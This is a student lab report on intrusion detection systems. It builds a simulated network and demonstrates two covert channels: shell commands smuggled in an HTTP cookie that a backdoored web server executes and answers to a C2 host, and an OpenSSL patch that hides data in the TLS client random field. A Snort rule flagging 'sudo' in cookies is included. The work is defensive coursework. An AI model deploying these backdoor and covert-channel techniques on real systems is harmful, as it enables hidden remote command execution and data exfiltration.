title: "CS4404 Mission 3"
date: "December 8, 2019"
author:
    - "David Larson"
    - "Ben Longo"
    - "Cole Winsor"

# Introduction

Organizations are constantly trying to protect themselves from attackers. These attackers seek to propagate through an organizations network or exfiltrate data. Intrusion Detection Systems (IDSs) can provide the defense an organization need against these adversaries. Attackers are constantly developing methods for attack, so defense mechanisms must evolve accordingly. In this project, we have explored various attack vectors that adversaries may take to gain leverage in an organization's network. We developed some infrastructure simulating a realistic network topology, came up with and implemented a few different attack vectors, and explored defending against them.

# Reconnaissance Phase

The goal of intrusion detection systems (IDS) is to identify and block suspicious network behavior. This suspicious network traffic may come from attackers who want to attack networks for a variety of reasons. Attackers may want to harm the availability of the service. One way of doing this is through a Denial of Service (DOS) attack, such as the Mirai attacks, which is focused on bringing down or overwhelming a networked service so that it cannot respond to legitimate requests(15). In addition, attackers may want to affect confidentiality, such as by stealing data or account credentials from a company. One high profile example of this is the Equifax Breach, where hackers were able to gain access to over 140 million customers social security numbers by using known vulnerabilities that Equifax had failed to patch(1).  Attackers may want to exploit integrity and authenticity. For example, in a trust relationship attack, an attacker could escalate their privileges by gaining access to a less protected server and use a trust relationship to pivot and gain access to a more secure server(2).  

Network security specialists must defend from these attacks. There are three major categories of IDS: packet inspection tools, flow monitoring tools, and software defined Networking (SDN) based monitoring. Each IDS has tradeoffs between performance and being able to better connect, and the pros and cons of each approach is discussed.

## Packet Inspection Tools

Packet inspection tools analyze the headers and data from packets going through a network in order to identify malicious traffic (3). This is done using a programmable set of rules which defined the malicious traffic, which is then filter out by the packet inspection tool. Packet inspection tools are best implemented on the edge of your private network, acting as a gateway to the public internet.  Packet inspections tools include implementations such as Snort (4), nDPI (5), and Zeek (6). 

Packet inspection tools can be configured to defend against most types of attacks. Rules can be created  to detect and mitigate availability attacks, such as DoS attacks. Rules can be used to identify malicious traffic to help defend a systems authenticity, integrity, and confidentiality goals.

These tools are helpful because they are able to give detailed analysis on the traffic going though a network. This enables it to more easily detect traffic which contains malicious data such as viruses. The use of programmatic rules makes packet inspection easily able to protect against new types of attacks.

The are several cons to packet inspections tools. One of the main concerns for packet inspection is performance(7). Packet inspection can be very CPU intensive as it must analyze all traffic through the network interface. This also means that it is hard to scale, because it needs the hardware it is run on to scale with the traffic requirements. This means that for high bandwidth connections, tradeoffs may need to be made between security and speed.

## Flow Monitoring Tools

Flow monitoring tools are able to protect networks by aggregating traffic information into flows and later analyzes the flow data. This is done in three steps: Flow exporting, flow collecting, and flow analyzing. Flow monitoring tools can be enabled on most routers and switches. It is suggested flow monitoring is distributed across your network to give wide view of your network. There are many different flow monitoring tools such as SolarWinds(8) or ManageEngine(9), and almost all tools used the NetFlow protocol(10).  

Flow monitoring tools are able to easily detect availability-based attacks. In addition, they can detect simpler confidentiality, integrity, and authenticity attacks which use easily identifiable traffic patterns. However, as these attacks become more sophisticated, flow monitoring tools are less likely to detect the intrusion.

One of the benefits of flow monitoring tools is that nearly all routers support the tools, so they are easy to configure and use. Another benefit is that it is distributed, giving statistics throughout your entire network (11). Finally, flow monitoring tools have a very low overhead (11), which combined with easy  deployment make them very easy to scale.  

There are several cons to flow networking tools. First, they are less dynamic when compared to packet inspection tools as they cannot respond to attacks which are detected. In addition, they see less details compared to packet inspection, so they may not be able to detect more sophisticated attacks. This means that although flow monitoring tools are helpful, they may not be enough on their own to properly protect a private network. 

## SDN-based Monitoring

Software Defined Networking (SDN) is a network architecture focused on improving flexibility  by separating  the data-forwarding plane from the network control plane (12). This approach allows programmatic changes to the routing and other functional aspects of network devices. In addition, it allows the network to be controlled dynamically to add security functionality. Most SDNs are implemented using the OpenFlow protocol so SDN-based monitoring is also implemented for the same protocol. OpenFlow contains both controllers, which control the SDN, and routers, which route traffic. The OpenFlow routers create a overlay network which can be dynamically controlled by a centralized OpenFlow controller.

One example of SDN-based-monitoring implements TLSDeputy, a TLS verification tool, to protect residential networks(13). The residential network contains a OpenFlow which his configured to route new flows through the TLSDeputy to verify the TLS handshake, and once verified leaves a direct connection between the client and server. This use of SDN implements extra monitoring of TLS handshakes, keeping clients more protected.

SDN-based monitoring is a powerful combination of the benefits of packet inspection tools and flow monitoring. Like flow monitoring, it can be easily deployed and scaled. In addition, it gives more visibility and control over the network(14). However, like packet inspections it can be dynamically configured, and can both detect and mitigate attacks. SDN-based monitoring can be configured to detect availability attacks and mitigate their effects. In addition, the controller can implement rules and services which help in detecting or stopping authenticity and integrity based attacks. For example, the controller can control network rules so that only software systems that need to talk to each other can.

There are negatives to SDN-based monitoring. The centralization of control to a single OpenFlow controller means that there is a single point of failure(14). If this is exploited, attackers could gain nearly complete control of the SDN in question.  

# Infrastructure

For mission 3, our team decided to utilize a tool called Containernet in order to setup our desired network topology. This tool allows the creation of arbitrary simulated network topologies using Docker containers as hosts. Instead of creating our hosts on the VMs in zoolab, we ran our Containernet Network on a linux VM on one of our group member's r710 rack server.

We can define a network topology using a simple python program, and Containernet will do the work of creating the containers for each host, switches, controllers, and links.

```
#!/usr/bin/python

from mininet.net import Containernet
from mininet.node import Controller
from mininet.cli import CLI
from mininet.log import info, setLogLevel

setLogLevel('info')

net = Containernet(controller=Controller)
net.addController('c0')

router = net.addDocker('r', dimage="cs4404m3t9/router")

# LAN configuration
lan_switch = net.addSwitch('s1')
net.addLink(lan_switch, router)

db = net.addDocker('db', dimage="cs4404m3t9/db",
                   dcmd="docker-entrypoint.sh postgres")
ws = net.addDocker('ws', dimage="cs4404m3t9/ws")

net.addLink(ws, lan_switch)
net.addLink(db, lan_switch)

# WAN configuration
wan_switch = net.addSwitch('s2')

net.addLink(router, wan_switch)

c2 = net.addDocker('c2', dimage="cs4404m3t9/c2")
net.addLink(c2, wan_switch)

client_1 = net.addDocker('client_1', dimage="cs4404m3t9/client")
client_2 = net.addDocker('client_2', dimage="cs4404m3t9/client")
client_3 = net.addDocker('client_3', dimage="cs4404m3t9/client")
net.addLink(client_1, wan_switch)
net.addLink(client_2, wan_switch)
net.addLink(client_3, wan_switch)

net.start()

ws.cmd("nohup python3 server.py &")
router.cmd('bash entry.sh')

net.ping([c2, ws])
net.ping([client_1, ws])
net.ping([client_2, ws])
net.ping([client_3, ws])

net.ping([ws, client_1])
net.ping([ws, client_2])
net.ping([ws, client_2])

net.ping([ws, db])

CLI(net)
net.stop()
```

Containernet makes creating this network topology extremely easy. We can define exactly what hosts we want using `net.addDocker()`, create links with `net.addLink()`, and add switches using `net.addSwitch()`. Once all of our Docker images are generated, which we have created a makefile to do, we can just run the above python program and Containernet will create our network for us and give us a shell into any host the network.

## Defined Network Topology

In our defined network topology, we have two different switches, representing a LAN and a WAN. The LAN contains our web server which handles HTTP requests from clients, and a database which contains a bunch of dummy data to be served up. The WAN contains our simulated clients and our command and control. Both the LAN and the WAN are connected via a bridge that we have implemented in another container.

### Web Server

The web server is our compromised host on the LAN. We have set it up to communicate with the database on the same network. We have given it some basic functionality, such as logging in, creating a user, and returning the information associated with the signed in user (we have elected to store a SSN). A user can sign into our web server with a simple `http post` such as `curl -d user_id=1 10.0.0.3:5000/signin`. Here we are passing in our ID of 1, and we will be signed in. We are then redirected to `/home`, where our information is displayed. 

The concept of "signing in" here is implemented with cookies. A user can make a signin request to the web server with their user ID, and the web server will create a cookie and return it to the user. The user then makes a request to the `/home` page of the web server and passes in that cookie, which contains their user ID, and they are returned their information from the database. An example of a cookie from our web server looks like this:

```
10.0.0.3	FALSE	/	FALSE	0	session_id	97
```

In the above case, the ID of the user making the request is 97.

Obviously this is not a secure protocol, but it works the same way signed tokens do at the network level.

### Database

We have created a Postgres instance for our web server to retrieve data from. The schema we have defined is very simple; each record consists of a user ID, a name, and a social security number (SSN). We populated this database using a python library called `Faker` which can generate realistic data for this purpose. A few entries of this data are as follows:

```
1	Dr. Daniel Hughes DDS	566-34-2680
2	Sherry Romero	053-92-3516
3	Timothy Marsh	828-34-8028
4	Stephen Taylor	586-58-3322
5	Andrew Kelley	883-40-8183
```

We loaded this data into a table and then baked it into the Docker image so that our database container will have the necessary data in it upon startup. The following line from the Dockerfile achieves this:

```
COPY dump.sql /docker-entrypoint-initdb.d/
```

### Clients

We have created three basic web clients in order to generate legitimate traffic across our bridge. These clients are configured with a script `client.sh` for making requests to the web server. The script makes a signin request to the entered host and stores the received cookie. The command is as follows:

```
curl -s -c cookies -XPOST -F "user_id=$((RANDOM % 1000))" "http://$1:5000/signin" | w3m -dump -T text/html
```

The client then makes a request to the `/home` page using the cookie it returned, and effectively logs out by deleting it's cookie. We also have included a script called `loadgen.sh` which runs `client.sh` every two seconds repeatedly to generate traffic through the bridge.

### Bridge

We have created a container to simulate a connection between the LAN and WAN. We have defined this container in a folder called `router`, as it simulates the channel through which all of the traffic must run, but it is really more of a firewall. Containernet provides two virtual ethernet connections to the respective switches, so we create a bridge interface to create a virtual cable between them, while allowing an IDS to listen to all the traffic coming and going from the LAN. 

```
ip addr flush dev $IFIN
ip addr flush dev $IFOUT

brctl addbr br0
brctl addif br0 $IFIN $IFOUT
ifconfig br0 up
```

The reason we created a container to house this is to allow us to have a man in the middle. We have set up Snort on this container so that we can monitor the traffic going between the LAN and WAN.

# Attack Phase

## Cookie Attack

The first phase of our attack hides our executable code in one of the cookies sent by our command and control server (C2). This attack vector allows us to run code on our compromised server by making normal looking HTTP requests from our C2. We can generate our cookie inline in the curl command as follows:

```
curl -b "secret_message:echo You've been compromised :D" -d "user_id=1000" http://10.0.0.3:5000/home
```

As one can see, we have embedded some shell code in a field of the cookie we are passing in. Now this isn't going to do anything without a little help from our compromised server. This being the case, we have added some code in the web server to check whether or not there is a `secret_message` cookie. If it has one, the server will attempt to execute the code included in that field. The output will be put into a cookie and sent back to our C2 host. With this structure, the web server will continue to serve other clients as normal, but still can execute the arbitrary code bits that we send to it.

## TLS Handshake Attack

From the perspective of a router, our cookie attack looks just like normal web requests. However, if somebody was able to intercept a cookie we sent over the network and peek at the contents, they would clearly see that the cookie was malicious. This being the case, we wanted to come up with something a little bit harder to detect. We embed data into 32 byte client random field of the TLS handshake. Since this data is typically just random bytes, if we were to encrypt the data we're sending it would be theoretically indistinguishable from random bytes and therefore undetectable at the network level(this data is normally not ever seen by humans anyway). Fortunately, we have a compromised web server on which we could implant the public key of our C2 host giving us a two way encrypted channel. Theoretically, we could establish an encrypted 2 way channel through this field.

To implement our TLS handshake attack, we had to create a patch for the `OpenSSL` library on tag `OpenSSL_1_1_0d` used by our C2 server.

```
diff --git a/ssl/s3_lib.c b/ssl/s3_lib.c
index e94ee83717..dea248539c 100644
--- a/ssl/s3_lib.c
+++ b/ssl/s3_lib.c
@@ -48,6 +48,7 @@
  */
 
 #include <stdio.h>
+#include <string.h>
 #include <openssl/objects.h>
 #include "ssl_locl.h"
 #include <openssl/md5.h>
@@ -3925,21 +3926,26 @@ long ssl_get_algorithm2(SSL *s)
  */
 int ssl_fill_hello_random(SSL *s, int server, unsigned char *result, int len)
 {
-    int send_time = 0;
+    int send_time = 1;
+    FILE * pFile;
+    pFile = fopen("/user_id", "r");
+
+    int user_id = 0;
+
+    if (pFile!=NULL) {
+        fscanf(pFile, "%d", &user_id);
+        fclose(pFile);
+    }
 
     if (len < 4)
         return 0;
-    if (server)
-        send_time = (s->mode & SSL_MODE_SEND_SERVERHELLO_TIME) != 0;
-    else
-        send_time = (s->mode & SSL_MODE_SEND_CLIENTHELLO_TIME) != 0;
-    if (send_time) {
-        unsigned long Time = (unsigned long)time(NULL);
-        unsigned char *p = result;
-        l2n(Time, p);
-        return RAND_bytes(p, len - 4);
-    } else
-        return RAND_bytes(result, len);
+
+    unsigned long Time = (unsigned long)time(NULL);
+    unsigned char *p = result;
+    l2n(Time, p);
+    RAND_bytes(p, len - 4 - 4); // Extra -4 so we can slap in the user_id 
+    memcpy(p, &user_id, 4);
+    return 1;
 }
 
 int ssl_generate_master_secret(SSL *s, unsigned char *pms, size_t pmslen,
```

Instead of generating a random sequence of 32 bits, we simply load an integer in from a text file. This is where we could embed shell code or other information, but for our use case we simply have embedded an integer in the first four bytes of the random sequence. Now we can run a request using https from our C2, and the TLS handshake will automatically be initiated. On the server side we use `tshark` to extract the client random from each handshake:

```
tshark -l -i ws-eth0  -f "tcp port 5000" -Y "ssl.handshake.type == 1" -o http.ssl.port:5000 -T fields -e ssl.handshake.random_bytes 2>/dev/null

# Real Clients
29:81:95:f6:85:5e:64:cf:b3:2e:1d:60:70:92:a0:fa:df:b2:44:58:0c:06:67:ca:b4:f4:0a:72
62:b4:60:ea:ce:ee:2f:eb:c0:b1:50:a5:81:56:12:b2:ec:13:87:10:49:f2:3d:09:72:79:06:85

# C2 Traffic
01:00:00:00:33:23:f4:41:0d:26:78:bf:c8:d7:45:bd:0f:49:6a:7d:6e:40:b0:88:00:00:00:00
02:00:00:00:a1:19:dd:16:4b:f3:97:71:fc:9c:52:c2:d8:d9:75:2f:98:8d:27:0d:00:00:00:00
03:00:00:00:68:9c:54:a6:94:d7:86:04:10:e0:69:3e:c8:5f:95:5e:8b:a5:d8:62:00:00:00:00
04:00:00:00:fa:84:48:03:00:70:90:a2:6a:dd:f1:35:ba:0d:f0:a4:3a:30:b1:a1:00:00:00:00
05:00:00:00:47:b7:17:f0:13:89:b8:44:b0:79:4b:00:aa:de:d6:ce:3a:34:43:7b:00:00:00:00
06:00:00:00:68:25:39:41:3d:cf:ec:51:5c:63:35:68:c0:1a:44:aa:f5:1b:1c:0d:00:00:00:00
07:00:00:00:d9:14:34:a4:d5:07:57:5b:a5:88:c4:98:47:1d:f7:fb:b2:5f:52:ae:00:00:00:00
```

As one can see, the real clients have legitimate random data. Our C2 sends our desired data in the first four octets of the sequence. We also have set the last 4 octets to be all zeros in order to denote which packets have encoded data, and which do not. This is clearly detectable at the network layer, but if we had encrypted the data, it would not be distinguishable from random data.

We have written some code to detect hidden messages. Since the bytes are little-endian in the 32 bit random field of the TLS handshake, we reverse the order of the bytes, and then interpret the value as an integer. In a more complicated system where this data was encrypted, we would simply decrypt the data. The last two bytes could be sacrificed for a checksum, which would be a perfect way for us to tell if there was an encoded message or not. However, for the sake of simplicity, we have just designated the last 4 bytes of an encoded message to be all zeros.
```
root@ws:/usr/local/server# ./exfil.sh
+ tshark -l -i ws-eth0 -f 'tcp port 5000' -Y 'ssl.handshake.type == 1' -o http.ssl.port:5000 -T fields -e ssl.handshake.random_bytes
+ python3 exfil.py
EXFIL REQUEST FOR 1
EXFIL REQUEST FOR 2
EXFIL REQUEST FOR 3
EXFIL REQUEST FOR 4
EXFIL REQUEST FOR 5
EXFIL REQUEST FOR 6
EXFIL REQUEST FOR 7
EXFIL REQUEST FOR 8
EXFIL REQUEST FOR 9
EXFIL REQUEST FOR 10
EXFIL REQUEST FOR 11
EXFIL REQUEST FOR 12
EXFIL REQUEST FOR 13
EXFIL REQUEST FOR 14
EXFIL REQUEST FOR 15
EXFIL REQUEST FOR 16
EXFIL REQUEST FOR 17
EXFIL REQUEST FOR 18
EXFIL REQUEST FOR 19
EXFIL REQUEST FOR 20
EXFIL REQUEST FOR 21
EXFIL REQUEST FOR 22
EXFIL REQUEST FOR 23
EXFIL REQUEST FOR 24
EXFIL REQUEST FOR 25
```
On the server we listen and parse out matching TLS handshakes. From our C2 server, we are simply sending integers from 1 to 25 to demonstrate that we can send dynamic data.

```
root@c2:/# curl -k https://10.0.0.3:5000
<!DOCTYPE html>
<html lang="en">
<body>
    <form action="/signin" method="post">
        <div>
            <label>User ID:</label>
            <input type="text" name="user_id" />
            <br />
        </div>
        <div>
            <input type="submit" value="Login" />
        </div>
    </form>
    <form action="createAccount">
        <input type="submit" value="Create Account" />
    </form>
</body>
```

Above, we can see that we can successfully make requests over HTTPS. We don't need to pass in a user ID because that information is embedded in the the `/user_id` file. This is crucial because the entire protocol still functions as intended. There were no modifications at the server to the TLS protocol. 

# Defense Phase

## Malicious Cookie Detection

In our bridge container, we are running Snort as a passive packet sniffer. Out of the box, Snort can define rules to write to a log or alert upon certain conditions. Since our attack consists of sending executable shell code as data in a cookie, we needed to make Snort extract cookies from http requests from clients. In the `/etc/snort/snort.conf` file, where the Snort configurations exist, we enabled cookie extraction. We also added port 5000 to the list of ports Snort would listen on.

```
preprocessor http_inspect_server: server default \
...
ports { 5000 } \
enable_cookie \
...
```
We then defined several rules to check cookies for containing commonly used shell commands, such as sudo.
```
alert tcp any any -> any 5000 (msg:"Malicious cookie detected!"; content:"sudo"; http_cookie; sid:100;)
```
This rule tells Snort to alert if a cookie extracted from an http cookie contains `sudo`. We can define these rules for any shell commands we choose. 

## TLS Handshake Defense

# Conclusion

This examination into intrusion detections systems (IDS) has revealed how difficult properly implementing these systems can be. There are several types of IDS, each of which is focused on solving different issues. Packet inspection tools focus on protecting the gateway to a private network by using rules to detect malicious packets. Flow monitoring tools allow distribute analysis of the private network. SDN-based monitoring allows distributed analysis, while also allowing dynamic protection rules. 

Despite the availability of several powerful defense tools, there are many ways to attack, allowing attackers to overcome availability, confidentiality, authenticity and integrity security goals. In addition, this project shows how it is nearly impossible to detect intrusions if you don't know the method of communication. A seemingly harmless feature such as cookies can be used to smuggle data into nd out to a private network. This is just one example, and there is an exhaustive list of other methods. Even if rules can be defined to identify these methods of covert communication, as we showed was possible with cookies, there are still undetectable ways of communication. The TLS handshake is an example of this, where a field containing random data could instead have malicious data, un undetectable attack. Overall, this shows the difficult of properly protecting networks, and the need for strong IDS tools. 



# Bibliography

1. https://www.cnet.com/news/equifaxs-hack-one-year-later-a-look-back-at-how-it-happened-and-whats-changed/
2. https://vulnerabilities.teammentor.net/article/4d3185fd-1e48-40af-bc07-71206c40806b
3. https://searchnetworking.techtarget.com/definition/deep-packet-inspection-DPI
4. https://www.snort.org/
5. https://www.ntop.org/products/deep-packet-inspection/ndpi/
6. https://www.zeek.org/
7. https://www.pcwdld.com/
8. https://www.solarwinds.com/
9. https://www.manageengine.com/
10. https://www.solarwinds.com/netflow-traffic-analyzer/use-cases/what-is-netflow
11. https://www.whatsupgold.com/blog/network-monitoring/what-is-network-flow-monitoring
12. https://www.opennetworking.org/sdn-definition/?nab=1&utm_referrer=https://www.google.com/
13. https://web.cs.wpi.edu/~cshue/research/cns16.pdf
14. http://comsoft-bh.com/2018/01/21/pros-and-cons-of-software-defined-networking-sdn/
15. https://www.csoonline.com/article/3258748/the-mirai-botnet-explained-how-teen-scammers-and-cctv-cameras-almost-brought-down-the-internet.html
